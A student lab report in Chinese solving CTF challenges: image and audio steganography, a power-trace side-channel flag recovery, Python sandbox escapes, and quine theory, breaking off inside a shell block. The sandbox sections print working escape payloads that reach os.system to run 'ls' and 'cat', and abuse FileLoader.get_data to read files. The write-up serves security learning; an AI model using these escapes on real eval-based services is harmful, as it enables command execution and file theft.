# 实验结果

## challenge1
exiftool
![[image.png]]


用binwalk查看内容

![[/assets/image/image1.png]]

但是看了下十六进制其实是有两个JJFI开头的，binwalk也太阴间了，没识别出来，差点第一题就给我干红温（

![[image3.png]]

只能手动命令提取，算偏移量。命令为

```python
dd if=songmingti_C66622FEEA68EC9349CD53C706795960.jpg of=hidden.jpg bs=1 skip=26657 count=390004
```

![[image4.png]]

flag为`AAA{the_true_fans_fans_nmb_-1s!}`

## challenge2

打开网页，web开发者工具丝滑连招查看,发现好像看不了源代码。

![[image5.png]]

元素里面是空的。为什么？因为alert弹窗冻结了整个页面的主线程。

我们采用暴力，在隐私设置里关闭这个网站的javascript权限。重新打开后就是这样的

![[cat.png]]

看到源码啦

![[catflag.png]]

查看十六进制文件找到了key:m1a0@888.结合ppt说有密码的大多是工具题。考虑使用steghide

![[imagekey.png]]

steghide这阴间东西mac的brew包管理里面没有，只能docker开了个容器下载，化身配环境仙人。然后一句代码就解出二进制内容了

![[imagehide.png]]

将得到的`010000010100000101000001011110110100010000110000010111110101100100110000011101010101111101001100001100010110101101100101010111110101001101110100011001010011100101001000001100010110010001100101010111110100110100110001011000010011000001111101`放入cyberchef

![[daan.png]]

![[chenggong1.png]]

## challenge3

直接先zsteg -a暴力看一下

![[c31.png]]

这行信息告诉我们：
在原图的 LSB（最低有效位）层，隐藏了另一个完整的PNG图片！

运行

```bash
zsteg -E "b1,rgb,lsb,xy" nanami.png > hidden.png
```

成功得到隐藏的图片（

![[hideimage.png]]

然后继续做法，发现hidden图末尾附加了数据。

![[ls.png]]

用zsteg提取出一个extracted_data.查看他的文件类型为data

尝试hidden

![[image11.png]]

提取并解压：我们使用 dd 命令从文件内部提取了数据流，然后用 Python 的 zlib 库进行解压，得到了 final_flag.txt 文件。

重大突破：我们将 final_flag.txt 作为原始图像数据来渲染。经过耐心的尝试，取得了巨大突破：

文件大小为397657,考虑质因数分解，进行尝试发现当宽度设置为 2197 时，图像是完全对齐、不再扭曲的，并且能看出是三条聊天消息的轮廓，与 hidden.png 的内容相呼应。

当前困境：虽然图像对齐了，但内容非常模糊，无法辨认。我放弃了（

![[image12.png]]

![[imagefenjie.png]]
# part2

## challengeA

基础exiftool查看信息

![[image123.png]]

1. PLTE (Palette) chunk 格式
    

- 用途: 存储图像所使用的颜色调色板。
    
- 结构: 它就是一连串的 RGB 数据。每个颜色条目由三个字节组成:
    
    - Byte 1: Red (R)
        
    - Byte 2: Green (G)
        
    - Byte 3: Blue (B)
        

PLTE 块的数据区长度必须是 3 的倍数。从 exiftool 输出中可以看到 Palette: (Binary data 768 bytes, use -b option to extract)，这说明调色板数据有 768 字节长。

> 768 textbytes div3 textbytes/color = 256 textcolors

- 索引: IDAT 块中存储的就不是每个像素的 RGB 值了，而是这个 256 色调色板的索引（从 0 到 255）。由于 28=256，所以每个像素正好用一个字节（8位）来表示。
    

#### EZStego 隐写原理 (解码视角)

EZStego 的核心思想是，人眼对亮度的变化比对色调的细微变化更敏感。

1. **原始调色板**: 图片中有一个原始的 `PLTE` 调色板，我们称之为 `P_orig`。它有 256 个颜色，索引从 0 到 255。
    
2. **亮度排序**: EZStego 的作者会计算 `P_orig` 中每一个颜色的亮度（Luminance），然后根据亮度值对调色板进行 **重新排序**，得到一个新的、按亮度升序排列的调色板，我们称之为 `P_sorted`。
    
3. **隐藏信息**: 秘密信息被编码在像素的 **新调色板索引** 的最低有效位（LSB）中。
    
    - 假设一个像素在图像中原始的索引是 `idx_orig`。
        
    - 我们在 `P_sorted` 中找到这个颜色，它会有一个新的索引 `idx_sorted`。
        
    - 秘密信息的一个比特（0 或 1）就藏在 `idx_sorted` 的 LSB 中。
        
4. **解码过程**: 我们的任务就是逆转这个过程。
    
    - 提取原始调色板 `P_orig`。
        
    - 计算每个颜色的亮度，并根据亮度生成排序后的调色板 `P_sorted`。
        
    - 为了方便，创建一个 **映射关系**：对于 `P_orig` 中的每一个颜色，它在 `P_sorted` 中的新索引是什么。例如，`mapping[idx_orig] = idx_sorted`。
        
    - 遍历图像中的每一个像素，读取其原始调色板索引 `idx_orig`。
        
    - 使用映射关系找到它在排序后调色板中的索引 `idx_sorted`。
        
    - 提取 `idx_sorted` 的最低有效位（LSB）：`bit = idx_sorted & 1`。
        
    - 将所有提取出的比特位拼接起来，每 8 个比特组成一个字节，再将字节转换为字符，最终得到隐藏的信息。
        

解题思路与过程

本次实验选择 **Python** 作为主要的编程语言，并利用其强大的图像处理库 **Pillow** (PIL Fork) 来完成任务。选择这些工具是因为 Python 语法简洁，而 Pillow 库能极大简化 PNG 图像的解析和数据提取流程，使我们能够专注于实现 EZStego 的解码算法。

### 加载图片并验证模式

首先，我们需要将目标图片 `palette.png` 加载到程序中，并确认其符合 EZStego 隐写的前提条件——即使用了调色板（Palette）颜色模式。

1. 使用 Pillow 库的 `Image.open()` 函数打开指定的图片文件。
    
2. 通过访问返回的 Image 对象的 `mode` 属性，检查其值是否为字符串 `'P'`。如果不是，则算法不适用。
    

_加载图片并验证颜色模式_


```python
from PIL import Image

img = Image.open('palette.png')

if img.mode != 'P':
    print("错误：图像非调色板模式！")
    exit()
```

### 提取并处理 PLTE 调色板

确认模式正确后，下一步是从图片中提取出原始的 `PLTE` 调色板数据。

1. 调用 Image 对象的 `getpalette()` 方法。该方法返回一个扁平化的列表，格式为 `[R1, G1, B1, R2, G2, B2, ...]`。
    
2. 为了便于后续处理，我们将这个一维列表转换为一个由 `(R, G, B)` 元组组成的列表，我们称之为 `palette_orig`。


_提取并格式化调色板数据_

```python
flat_palette = img.getpalette()
palette_orig = []
for i in range(0, len(flat_palette), 3):
    color_tuple = (flat_palette[i], flat_palette[i+1], flat_palette[i+2])
    palette_orig.append(color_tuple)
```

### 实现亮度排序与索引映射

这是 EZStego 解码算法的核心。我们需要根据亮度对原始调色板进行排序，并建立一个从原始索引到排序后索引的映射关系。

1. 定义一个函数，根据标准亮度公式 Y=0.299timesR+0.587timesG+0.114timesB 计算每个颜色元组的亮度值。
    
2. 创建一个临时的辅助列表，存储每个颜色的亮度、原始索引和颜色值本身。
    
3. 使用 Python 的 `sorted()` 函数，以亮度值为排序关键字，对这个辅助列表进行升序排序。
    
4. 创建一个大小为 256 的映射数组 `index_map`。遍历排序好的列表，在 `index_map` 的相应位置填入新索引。最终，`index_map[原始索引]` 的值就等于其对应的 `排序后索引`。
    

_计算亮度、排序并创建索引映射_

```python
def calculate_luminance(rgb):
    r, g, b = rgb
    return 0.299 * r + 0.587 * g + 0.114 * b

palette_with_luminance = []
for i, color in enumerate(palette_orig):
    palette_with_luminance.append({
        'lum': calculate_luminance(color), 
        'orig_idx': i
    })

sorted_palette = sorted(palette_with_luminance, key=lambda p: p['lum'])

index_map = [0] * len(palette_orig)
for sorted_idx, entry in enumerate(sorted_palette):
    orig_idx = entry['orig_idx']
    index_map[orig_idx] = sorted_idx
```

### 遍历像素、提取 LSB 并重组信息

现在我们可以遍历图像的每一个像素，利用之前建立的映射关系来提取隐藏信息比特流。

1. 使用嵌套循环遍历图像的每一个坐标 `(x, y)`。
    
2. 获取当前像素点的颜色值，即它在原始调色板中的索引 `orig_pixel_index`。
    
3. 利用 `index_map`，查找这个原始索引对应的新索引 `sorted_pixel_index`。
    
4. 对 `sorted_pixel_index` 执行按位与操作（`& 1`），提取其最低有效位（LSB）。
    
5. 将提取到的每一个比特依次存入列表 `extracted_bits`。
    

_提取像素索引，解码并收集比特流_

Python

```
pixels = img.load()
width, height = img.size
extracted_bits = []

for y in range(height):
    for x in range(width):
        orig_pixel_index = pixels[x, y]
        sorted_pixel_index = index_map[orig_pixel_index]
        bit = sorted_pixel_index & 1
        extracted_bits.append(bit)
```

### 寻找并确认 Flag

最后一步，我们将收集到的比特流转换成可读的字符串，并从中找出最终的 Flag。

1. 将 `extracted_bits` 列表中的比特每 8 个为一组进行切分。
    
2. 对每一组 8 个比特，将其转换为一个整数（即一个字节的 ASCII 值）。
    
3. 将所有转换后的字节组合成一个字节串（`bytes` 对象）。
    
4. 尝试将该字节串解码为字符串，并使用正则表达式（`re`模块）搜索 `flag{...}` 格式的字符串，即可找到最终的 Flag。
    

_组合比特并解码为最终信息_
```python
import re

hidden_bytes = []
for i in range(0, len(extracted_bits), 8):
    byte_bits = extracted_bits[i:i+8]
    if len(byte_bits) == 8:
        byte_val = int("".join(map(str, byte_bits)), 2)
        hidden_bytes.append(byte_val)

hidden_message = bytes(hidden_bytes).decode('latin-1', errors='ignore')

match = re.search(r'flag\{[a-zA-Z0-9_]+\}', hidden_message)
if match:
    print(f"成功找到 Flag: {match.group(0)}")
```



![[ans.png]]

flag为AAA{gOoD_joB_P4lEtTE_M0D3_c@N_al$\0_57E9o!}

## challengeB

本实验的核心任务是对一个给定的音频-视频转换过程进行逆向工程。我们得到了将音频文件（`.mp3`）转换为频谱动图（`.gif`）的Python脚本 `generate.py`，目标是编写一个恢复脚本，从 `.gif` 文件中还原出原始的音频信号。

通过对 `generate.py` 脚本的分析，我们了解到其正向转换流程为：

1. **音频加载**: 使用 `librosa` 库加载音频。
    
2. **频谱转换**: 计算音频的梅尔频谱图（Mel Spectrogram），并将其从能量单位转换为分贝（dB）单位。
    
3. **数据量化**: 对分贝值进行一次有损的量化操作，这是信息损失的主要来源。
    
4. 视觉编码: 将量化后的二维频谱图数据映射为一系列GIF图像帧。
    
    逆向工程的关键在于理解第4步“视觉编码”的规则。分析发现，频谱图中的每个数据点（即特定时间帧上特定频率分量的dB值）被可视化为GIF图像中的一个竖状条。通过分析脚本与输出GIF文件的几何属性，我们确定了图像维度与频谱维度的映射关系：GIF图像的水平轴对应频谱的频率维度，垂直轴对应分贝维度。竖状条的高度（即蓝色像素的数量）直接编码了该频率分量的dB值。
    

因此，我们可以通过计算蓝色像素的数量来反推出原始（量化后）的dB值。其核心恢复公式为：
$$
\text{dB}_{\text{recovered}} = \left( \frac{C_{\text{blue}}}{S} \right) \times q + \text{dB}_{\text{min}}
$$

其中，$C_{blue}$ 是在图像特定列中统计到的蓝色像素数量，S 是视觉缩放因子（在本题中为2），q 是量化步长（值为2），$dB_{min}$ 是预设的最小分贝值（-60 dB）。

## 代码实现步骤

我们的恢复脚本严格遵循上述原理的逆过程，主要分为两个阶段。

### step1：从GIF恢复梅尔频谱图

此阶段的目标是从 `.gif` 文件中逐帧解析图像，并根据上述公式重建出二维的频谱图矩阵。

1. 使用 `Pillow` 库打开 `.gif` 文件并逐帧读取。
    
2. 对于每一帧图像，遍历32个频率分量。每个频率分量对应到图像水平方向上的一个特定列。
    
3. 在对应的列上，沿垂直方向统计蓝色像素 `(0, 0, 255)` 的数量。
    
4. 将统计出的像素数量代入恢复公式，计算出该时间-频率点的dB值。
    
5. 将所有恢复出的dB值组合成一个完整的频谱图矩阵。
    
    该过程的核心实现代码如下：
    
    从GIF帧中恢复频谱图时间切片
    

```python
def recover_spectrogram_from_gif(gif_path):
    img = Image.open(gif_path)
    spectrogram_frames = []

    for frame_index in range(img.n_frames):
        img.seek(frame_index)
        frame_rgb = np.array(img.convert('RGB'))
        time_slice = []
        
        for freq_bin in range(num_freqs):
            # 频率分量对应到图像的特定列
            col_index = (freq_bin * 2 + 1) * 2
            
            # 获取该列的所有像素 (垂直切片)
            column_data = frame_rgb[:, col_index]
            
            # 统计蓝色像素数量
            blue_pixel_count = (column_data == color_pixel).all(axis=1).sum()
            
            # 根据公式恢复dB值
            logical_pixel_count = blue_pixel_count / quantize
            db_value = logical_pixel_count * quantize + min_db
            time_slice.append(db_value)
            
        spectrogram_frames.append(time_slice)
        
    # 转置以匹配librosa的格式 (n_mels, n_frames)
    return np.array(spectrogram_frames).transpose()
```

### step2：从频谱图恢复音频信号

获得频谱图矩阵后，我们使用 `librosa` 库提供的逆向功能将其转换回音频波形。

1. 使用 `librosa.db_to_power` 函数，将dB单位的频谱图转换回能量单位。
    
2. 使用 `librosa.feature.inverse.mel_to_audio` 函数，将梅尔能量频谱图逆转换为音频时间序列。
    
3. **关键点**: 在调用逆转换函数时，必须传入与 `generate.py` 中完全相同的音频参数，如采样率 `sr=22050`、FFT窗口大小 `n_fft=2048` 和帧步长 `hop_length=512`。任何参数的不匹配都将导致恢复失败。
    
4. 使用 soundfile 库将恢复出的音频时间序列保存为 .wav 文件。
    
    该过程的实现代码如下：
    
    将恢复的频谱图转换为音频文件
    

```python
def recover_audio_from_spectrogram(spectrogram, output_path):
    # 1. 分贝 -> 能量
    power_spectrogram = librosa.db_to_power(spectrogram)
    
    # 2. 梅尔谱 -> 音频 (使用与生成时相同的参数)
    y_recovered = librosa.feature.inverse.mel_to_audio(
        power_spectrogram,
        sr=22050,
        n_fft=2048,
        hop_length=512
    )
    
    # 3. 保存音频文件
    sf.write(output_path, y_recovered, 22050)
```

通过以上步骤，我们成功地从 `flag-1.gif` 和 `flag-2.gif` 中恢复了音频文件，并最终识别出歌曲分别为《Never Gonna Give You Up》和《雪花飘飘》。


## challengeC

### 一、 实验目的

本次实验旨在通过分析设备在处理不同输入时的功率消耗数据，还原出黑客攻击设备时使用的flag。实验核心是利用侧信道攻击（Side-Channel Attack）中的差分能量分析（Differential Power Analysis, DPA）技术，从物理泄露的能量信息中提取出密钥（即flag）。

### 二、 实验原理（求解思路）

### 1. 侧信道攻击简介

侧信道攻击是一种独特的攻击方式，它不直接攻击加密算法或协议的理论弱点，而是通过分析加密设备在运行过程中的物理信息泄露（如时间消耗、功率消耗、电磁辐射等）来获取敏感信息。

### 2. 差分能量分析 (DPA)

本次实验利用的正是差分能量分析。其基本原理如下：

- **功耗差异性**：设备在处理不同数据时，其内部晶体管的开关状态和次数会不同，从而导致瞬时功耗产生微小但可测量的差异。例如，当设备验证密码时，输入正确字符和错误字符所消耗的功率曲线会有所不同。
    
- **识别异常点**：对于flag的某一个位置，攻击者（我们）可以尝试输入所有可能的字符（如a-z, 0-9, _等），并记录下每一次尝试的功耗曲线。由于只有一个字符是正确的，其余都是错误的，因此，正确字符对应的功耗曲线会与大量错误字符的功耗曲线表现出统计上的差异，成为一个“异常”的轨迹。
    
- **逐位破解**：通过对flag的每一位都重复上述过程，我们就能逐个找出正确的字符，最终拼接成完整的flag。
    

总结来说，我们的核心思路就是：**通过可视化和数据分析，找出每个字符位置上那条“与众不同”的功耗曲线，它所对应的输入字符就是该位置的正确答案。**


### 实验步骤与代码实现

### 1. 数据加载与探索

首先，我们需要加载题目提供的 `data.npz` 文件。这是一个Numpy的压缩文件格式，里面可能包含多个数据数组。

**关键代码 1：加载数据并查看内容**

```python
import numpy as np

# 加载数据文件
dataset = np.load('data.npz', allow_pickle=True)

# 查看文件内包含的数据数组的键名
print("文件中的数据键名:", dataset.files)

# 根据键名加载数据
# 经过探索，正确的键名为 'power', 'input', 'input_id'
traces = dataset['power']      # 功率轨迹数据
inputs = dataset['input']      # 对应的输入字符
indices = dataset['input_id']  # 字符在flag中的位置索引
```

思路说明：

直接加载文件后，我们并不知道数据是如何组织的。通过 dataset.files 打印出文件中的所有键（Keys），我们发现数据被分别存储在名为 'power', 'input', 和 'input_id' 的数组中.

### 2. 识别正确字符并可视化

这是实验的核心部分。我们对flag的每一个位置（从0到26）进行遍历，找出该位置的正确字符。

**关键代码 2：循环分析每个位置并找出异常功耗轨迹**

```python
import matplotlib.pyplot as plt
import os

# ...（省略前面的加载代码）...

# 重建的flag字符列表
reconstructed_flag_chars = []
# 总共的字符位置数
num_positions = len(np.unique(indices))

# 对每一个位置进行分析
for i in range(num_positions):
    position_traces = []
    position_inputs = []

    # 筛选出当前位置的所有功耗数据和对应输入
    for j in range(len(traces)):
        if indices[j] == i:
            position_traces.append(traces[j])
            position_inputs.append(inputs[j])
    
    # --- 关键的异常检测算法 ---
    # 将列表转换为numpy数组以便进行数学计算
    traces_array = np.array(position_traces)
    # 1. 计算所有轨迹的平均轨迹
    mean_trace = np.mean(traces_array, axis=0)
    # 2. 计算每条轨迹与平均轨迹的距离（此处使用方差和）
    distances = np.sum((traces_array - mean_trace)**2, axis=1)
    # 3. 找到距离最远的轨迹，即为异常轨迹
    outlier_trace_index = np.argmax(distances)
    
    # 获取异常轨迹对应的正确字符
    correct_char = position_inputs[outlier_trace_index]
    reconstructed_flag_chars.append(correct_char)

    # --- 可视化部分 ---
    plt.figure(figsize=(12, 6))
    # 绘制所有轨迹（蓝色，半透明）
    for trace in position_traces:
        plt.plot(trace, color='blue', alpha=0.4)
    # 高亮绘制异常轨迹（红色）
    plt.plot(position_traces[outlier_trace_index], color='red', linewidth=2, label=f'Correct Character: \'{correct_char}\'')
    plt.title(f'Power Traces for Position {i}')
    plt.xlabel('Time Sample')
    plt.ylabel('Power Consumption')
    plt.legend()
    plt.grid(True)
    # 保存图片
    # plt.savefig(f'position_{i}_plot.png')
    plt.close()

```

**思路说明**：

- **循环与分组**：外层循环遍历flag的每一个位置。内层循环将所有功耗数据按位置分组。
    
- **异常检测**：我们假设大部分轨迹（错误字符）是相似的，它们的平均轨迹可以代表“正常”行为。通过计算每一条轨迹与这个“平均轨迹”的差异（距离），差异最大的那一条就是我们要找的异常轨迹。
    
- **可视化**：为了直观验证我们的判断，我们将所有轨迹绘制在一张图上。用蓝色表示普通轨迹，用红色高亮显示我们算法找到的异常轨迹，并标注出其对应的字符。
    

### 3. 结果整合

遍历所有位置后，我们就得到了构成flag的所有字符。

**关键代码 3：拼接最终的Flag**


```python
reconstructed_flag = "".join(reconstructed_flag_chars)

print(f"成功还原Flag: {reconstructed_flag}")
```

##  实验结果与分析

经过上述步骤，我们成功还原出flag。

**最终结果**:
![[Pasted image 20250722164430.png]]
```
0ops{power_1s_511_yvu_n55d}
```

**结果分析与可视化证据**：

通过对每个位置的功率轨迹图进行分析，我们可以清晰地看到，几乎在每个位置上，都有一条红色的轨迹明显区别于其他大量的蓝色轨迹。这验证了我们基于差分能量分析的猜想是完全正确的。

例如，Flag第一位（Position 0）的分析图：
![[Pasted image 20250722164449.png]]
图片描述：图中大量蓝色曲线形态接近，而一条红色曲线在某个时间点有明显的尖峰或凹陷，与其他曲线分离。


但是这个flag没有通过测试。相同的逻辑编写一个脚本，画出特定位置的字符对比，发现19位应该把v修改为0。
```python
import numpy as np
import matplotlib.pyplot as plt
import os

# --- 配置 ---
# 在这里修改你想要重点检查的位置
POSITION_TO_CHECK = 19
# ---

# 加载数据
try:
    dataset = np.load('data.npz', allow_pickle=True)
except FileNotFoundError:
    print("错误：找不到 data.npz 文件。请确保文件与脚本在同一目录下。")
    exit()

traces = dataset['power']
inputs = dataset['input']
indices = dataset['input_id']

# 创建一个专门的文件夹来存放检查结果
output_dir = f'manual_check_pos_{POSITION_TO_CHECK}'
if not os.path.exists(output_dir):
    os.makedirs(output_dir)

# 收集该位置的所有轨迹和输入
position_traces_map = {}
for j in range(len(traces)):
    if indices[j] == POSITION_TO_CHECK:
        char_input = inputs[j]
        if char_input not in position_traces_map:
            position_traces_map[char_input] = []
        position_traces_map[char_input].append(traces[j])

print(f"开始为 Position {POSITION_TO_CHECK} 的每个字符生成独立的、可正常显示的轨迹图...")

# 为每个字符单独生成一张图
for char, traces_list in position_traces_map.items():
    plt.figure(figsize=(10, 5))
    plt.title(f'Position {POSITION_TO_CHECK} - Character \'{char}\'')
    
    # 将该字符的所有轨迹都画出来
    for trace in traces_list:
        plt.plot(trace)
        
    plt.grid(True)
    

    # 文件名包含字符，方便查找
    plt.savefig(os.path.join(output_dir, f'char_{char}.png'))
    plt.close()

print(f"分析完成！请检查 '{output_dir}' 文件夹中的所有图片，这次它们应该可以正常显示了。")
```
```
0ops{power_1s_511_y0u_n55d}
```

## challengeD

## sendbox6
```python
from __future__ import print_function
print('''pysandbox6: clear __builtins__
why don't we also clear the __builtins__ so that eval can be easier?''')

try:
    input = raw_input
except:
    pass
c = input()
x=globals
_eval = eval

import sys
sys.modules.clear()

for i in list(__builtins__.__dict__.keys()):
    if i not in ["print", "list", ]:
        del(__builtins__.__dict__[i])

print(_eval(c))

```

在动手构造Payload之前，我们首先分析了目标环境的限制：

1. **代码执行入口**: 核心漏洞点是服务器直接执行用户输入的`eval(c)`。
    
2. **`sys.modules.clear()`**: 该操作清空了所有模块缓存，导致`__import__()`函数失效，我们无法通过常规方式导入`os`, `subprocess`等危险模块。
    
3. **`__builtins__`清理**: 这是最大的挑战。除了`print`和`list`，其他所有内建函数和类型（如`object`, `dict`, `str`, `open`, `eval`, `exec`等）都被删除。这使得常规的沙箱逃逸技巧（如直接调用`open()`）和Python的基本操作（如创建元组`()`、字典`{}`）都无法使用。discovery_payload = "[c.__name__ for c in list.__mro__[1].__subclasses__()]"

**第一阶段：找回`object`**

- **思路**: 既然无法按名称使用任何内建类型，我们必须从唯一可用的非函数类型`list`入手。我们知道，任何类型都继承自`object`。通过访问`list`类的“方法解析顺序”（Method Resolution Order, MRO），我们可以找回被隐藏的`object`类。
    
- **Payload**: `list.__mro__[1]`
    
- **突破**: 拿到`object`类后，我们就可以调用`object.__subclasses__()`，这相当于打开了通往服务器内存中所有已加载类的“百宝箱”。

- 我们构造了一个“探索专用”的Payload。
- **调试Payload**:
    ```python
    # 此Payload的目的是列出服务器内存中所有类的名字
    [c.__name__ for c in list.__mro__[1].__subclasses__()]
    ```
![[Pasted image 20250723105000.png]]

列表中包含大量Python 3特有的类，证明目标环境是**Python 3**

- **最终Payload**:
    
    - **列出文件**: `[c for c in list.__mro__[1].__subclasses__() if c.__name__ == '_wrap_close'][0].__init__.__globals__['system']('ls -F')`
        
    - **读取文件**: `[c for c in list.__mro__[1].__subclasses__() if c.__name__ == '_wrap_close'][0].__init__.__globals__['system']('cat flag_filename')`
        
- **工作原理**: `system()`会直接将其执行命令的结果打印到标准输出，我们的`pwnlib`脚本会接收到这个输出。
![[Pasted image 20250723105200.png]]
AAA{python_sandbox_is_NOT_safe_88c38bd9}

## sendbox10

`chal_10` 的沙箱环境在前序挑战的基础上，增加了更多限制。

1. **前置验证**: 连接后必须先输入 `chal_6` 的正确Flag。
    
2.**(`del __import__`)**: 从 `importlib` 核心中删除了 `__import__` 函数的实现，使任何依赖 `__import__` 的代码（包括我们之前依赖的 `catch_warnings` 路径）失效。
    
2. **清空 `os` 模块 (`os.__dict__.clear()`)**: 它保留了 `os` 模块的框架，但清空了其内部所有函数。这导致我们依赖 `_wrap_close` 或 `_Printer` 等类访问 `os` 模块全局变量的思路被彻底堵死。
    
3. **清理全局变量和内建函数**: 和 `chal_6` 一样，只留下了极少数的变量和函数（`print`, `list` 等），迫使我们必须从最底层开始构建攻击链。

我们首先发现，直接连接会被要求输入前一题的Flag。
![[Pasted image 20250723110820.png]]
确认此点后，我们修改了`pwntools`脚本，增加了自动提交Flag的步骤。紧接着，我们沿用了被证明行之有效的“探索”策略，向服务器发送了一个探索Payload，目的是获取当前环境下所有可用的类的列表。

- **探索Payload**: `[c.__name__ for c in list.__mro__[1].__subclasses__()]`
![[Pasted image 20250723110927.png]]
拿到了完整的类列表后，我们开始分析并尝试构建攻击路径，这个过程我们证伪了两个看似可行的方案：

1. **证伪路径A (`_wrap_close`)**: 虽然列表中存在 `_wrap_close`，但我们分析得出，它所引用的 `os` 模块的 `__globals__` 字典已经在挑战开始时被 `os.__dict__.clear()` 清空了。此路不通。
    
2. **证伪路径B (`catch_warnings`)**: 列表中也存在 `catch_warnings`。我们曾寄希望于它保留了一个旧的、可用的 `__import__` 函数。但深入分析后发现，`del(importlib...['__import__'])` 删除的是函数的源头，导致所有对它的引用全部失效。此路同样不通。

`FileLoader` 是Python底层导入机制的一部分，其天职就是读取文件。它拥有一个不依赖任何外部模块（如 `os`）的方法：`get_data(path)`，可以读取指定路径的文件内容。

但它也有一个缺点：无法列出目录。因此，我们必须采取**猜解**的策略，尝试读取一系列常见路径下的flag文件。

- **最终Payload模板**:
    ```python
    "[c for c in list.__mro__[1].__subclasses__() if c.__name__ == 'FileLoader'][0]('dummy','dummy').get_data('{path}')"
    ```
    
    我们编写了一个循环，将 `'./flag'`, `'flag'`, `'/flag'` 等常见路径填入 `{path}` 中，逐一尝试。
将最终的攻击逻辑写入 `pwntools` 脚本并执行。脚本自动完成了Flag验证，然后开始遍历常见路径进行尝试。
![[Pasted image 20250723111045.png]]
AAA{Master_0f_Python_7be0c211c8b82262}

## challengeE
https://github.com/wmww/Python-plus-plus?tab=readme-ov-file


http://www.madore.org/~david/computers/quine.html
定点定理
**递归论（或可计算性理论）中的不动点定理**，通常被称为**克林不动点定理 (Kleene's Recursion Theorem)**。

这个定理是Quine（自产生程序）存在的理论核心。
### ## 核心概念

在理解这个定理之前，我们需要知道几个基本概念：

1. **可计算函数 (Computable Function)**: 一个函数是可计算的，如果存在一个程序（或者说图灵机、算法）能够计算它。比如，加法、乘法都是可计算的。
    
2. **程序编号 (Program Numbering)**: 我们可以给计算机世界里所有的程序进行编号。比如，把每个程序的二进制代码看作一个巨大的整数。因此，第 n 个程序就可以表示为 ϕn​。
    
3. **通用性定理 (Universality Theorem)**: 存在一个通用的程序（或通用图灵机），我们称之为 u。它的作用像一个**解释器**：你给它一个程序的编号 n 和一些输入，它就能模拟程序 n 在这些输入上运行的结果。即 ϕu​(n,…)=ϕn​(…)。这说明用一种编程语言写一个该语言的解释器是可能的。
    
4. **s-m-n 定理 (s-m-n Theorem)**: 这个定理与通用性定理互补。它说明，如果你有一个接受多个输入的程序 ϕn​(x,y,…)，你可以写一个辅助函数 s，把其中一个输入 x **“固化”到程序中，从而生成一个**新程序 ϕs(n,x)​，这个新程序只接受剩下的输入 (y,…)。简单来说，它允许你将一个程序的**部分输入转换成程序自身代码的一部分**。
    


### 不动点定理的陈述与证明

#### 定理内容

对于**任何**可计算的程序转换操作 h，必然**存在**一个程序 n，使得程序 n 的行为与 h 作用于 n 后产生的新程序 h(n) 的行为**完全相同**。

用公式表达就是：

> 对于任意可计算函数 h，存在一个程序编号 n，使得 ϕn​(…)=ϕh(n)​(…)。

这里的 h 可以是任何对程序代码的“改造”算法，比如“把程序的所有注释删掉”、“把程序编译成另一种语言”或者“把程序的功能打印出来”。这个定理说明，无论你如何定义这种改造，总能找到一个“不动点”程序 n，它本身的行为就等同于它被改造后的行为。

####  证明思路

证明过程非常精妙：

1. 我们定义一个程序 m。它的功能是：接收一个程序 t作为输入，然后计算出 h(s(t,t)) 这个新程序，并执行它。（s(t,t) 的意思就是把程序 t 自身的代码作为输入，固化到 t 里面去）。
    
2. 现在，我们把这个程序 m **应用到它自己身上**，得到一个最终的程序 n=s(m,m)。
    
3. 这个 n 就是我们想要的**不动点**。为什么呢？
    
    - 程序 n 的行为 ϕn​ 就是 ϕs(m,m)​。
        
    - 根据 s 函数的定义，ϕs(m,m)​ 的行为是把 m 作为输入，运行程序 m，即 ϕm​(m)。
        
    - 根据我们对 m 的定义（第一步），ϕm​(m) 的行为是执行 h(s(m,m))。
        
    - 而 s(m,m) 就是 n，所以 ϕm​(m) 的行为就是执行 h(n)，即 ϕh(n)​。
        
    - 综上所述，ϕn​=ϕh(n)​。证明完毕。
        

这个证明的核心思想是构造一个程序 m，它会先将自己的输入“自我引用”一下，再应用转换 h；然后将这个程序 m 应用于自身。

### 如何用不动点定理证明 Quine 的存在

这非常简单：

1. 我们定义一个转换函数 h(t)，它的功能是：**生成一个能够打印出程序 t 源代码的程序**。这个 h 显然是可以计算的（就像一个简单的代码生成器）。
    
2. 根据不动点定理，必然存在一个程序 n，使得程序 n 的行为 (ϕn​) 和程序 h(n) 的行为 (ϕh(n)​) 完全相同。
    
3. 程序 h(n) 的行为是“打印出程序 n 的源代码”。
    
4. 因此，程序 n 的行为也是“打印出程序 n 的源代码”。
    

这就证明了，**必然存在一个程序 n，它的功能就是打印出自身的源代码**。这正是 Quine 的定义。



#### 1. quine的实现
实验的核心目标是，严格遵循Quine的定义，编写并验证一个能够输出自身完整、精确源代码的C语言程序。禁止任何“作弊”行为（如直接读取源文件）.

#### **2. 基本原理**

Quine（自再现程序）的实现基于“代码/数据二分法”的核心思想。程序被分为两个部分：

- **数据部分 (Data):** 以特定格式（如字符串、数组）存储程序自身的“蓝图”。
    
- **代码部分 (Code):** 负责解释“数据”，并利用它来重构出包括数据和代码在内的完整程序。 本次实验的挑战在于，确保代码部分的输出结果与程序源文件的物理内容（包括所有字符、换行、缩进）达到数学级别的完全一致。

#### **3. 实验过程与结果分析**

##### **阶段一：经典`printf`法的初步尝试与“幽灵问题”的出现**

- **实验设计：** 采用经典的单字符串`printf`技巧。将整个程序的代码模板（包含换行符`\n`）存储在一个`const char *s`字符串中，然后通过`printf(s, 34, s, 34)`来展开模板，实现自我复制。
    
- **观察结果：** 实验反复失败。`diff`工具持续报告同一个错误：源文件（Source）的字符串定义是一个物理单行，而输出文件（Generated）因为`printf`解释了`\n`而变成了多行。
    ![[Pasted image 20250722174720.png]]
- **初步分析：** 最初的假设是，问题出在实验环境上，例如文本编辑器的“自动换行”功能或文件末尾的换行符处理。我们尝试了多种方法（包括使用`cat <<'EOF'`命令）来精确控制源文件的物理格式。然而，即使在保证文件创建过程绝对可靠的情况下，问题依然存在。这使我们一度陷入困境，该问题表现得如同一个无法解释的“幽灵”。
    
##### **阶段二：逻辑谬误的证伪与方法的革新**

- **分析突破：** 经过反复的、原子性的诊断测试（集创建、编译、运行、比对为一体的脚本），我们最终排除了所有环境因素。结论只有一个：我们最初采用的C代码，其**内在逻辑是错误的**。简单的`printf`技巧无法处理自身模板中包含的`\n`字符所导致的“源文件物理格式”与“程序输出格式”之间的根本性矛盾。
```sh
# --- BEGIN COMMAND BLOCK ---

echo "Step 1: Forcibly creating quine.c with perfect content..."
cat > quine.c <<'EOF'
填入c代码内容
EOF
echo "File creation complete."
echo ""

echo "Step 2: Displaying the actual content of the created quine.c"
echo "============================================================"
cat quine.c
echo "============================================================"
echo ""

